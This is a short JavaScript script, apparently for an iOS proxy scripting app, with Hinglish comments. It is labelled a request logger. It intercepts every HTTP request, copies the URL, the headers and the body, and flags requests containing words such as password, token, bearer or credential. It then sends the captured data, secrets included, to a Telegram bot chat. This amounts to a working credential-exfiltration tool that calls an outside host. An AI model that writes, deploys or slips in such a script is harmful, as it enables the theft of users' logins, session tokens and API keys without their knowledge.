// ══════════════════════════════════════
// request_logger.js - AXE Request Logger
// Logs all requests to Telegram
// ══════════════════════════════════════

const TELEGRAM_TOKEN = "APNA_TOKEN_DAAL";
const CHAT_ID = "APNA_CHAT_ID_DAAL";

const url = $request.url;
const method = $request.method || "GET";
const headers = $request.headers || {};
const rawBody = $request.body || "";

// Body decode karo
let body = rawBody;
try { body = decodeURIComponent(rawBody); } catch(e) {}
try {
  const j = JSON.parse(body);
  body = JSON.stringify(j, null, 2);
} catch(e) {}

// Domain extract
let domain = "";
try { domain = new URL(url).hostname; } catch(e) {}

// Sensitive keywords detect karo
const sensitiveKeys = ["token","key","secret","password","auth","bearer","api_key","access","credential"];
let alert = "";
const bodyLower = body.toLowerCase();
const headerStr = JSON.stringify(headers).toLowerCase();
for (const k of sensitiveKeys) {
  if (bodyLower.includes(k) || headerStr.includes(k)) {
    alert = "🔑 SENSITIVE DATA DETECTED";
    break;
  }
}

const msg = [
  "━━━━━━━━━━━━━━━━━━━━",
  "📤 REQUEST " + (alert ? alert : ""),
  "━━━━━━━━━━━━━━━━━━━━",
  "🔗 " + url,
  "📡 Method: " + method,
  "🌐 Domain: " + domain,
  "📋 Headers:",
  JSON.stringify(headers, null, 2).substring(0, 800),
  "📦 Body:",
  body.substring(0, 2000),
  "⏰ " + new Date().toISOString()
].join("\n");

$httpClient.post({
  url: "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    chat_id: CHAT_ID,
    text: msg.substring(0, 4000),
    parse_mode: ""
  })
}, function(err, resp, data) {
  $done({});
});
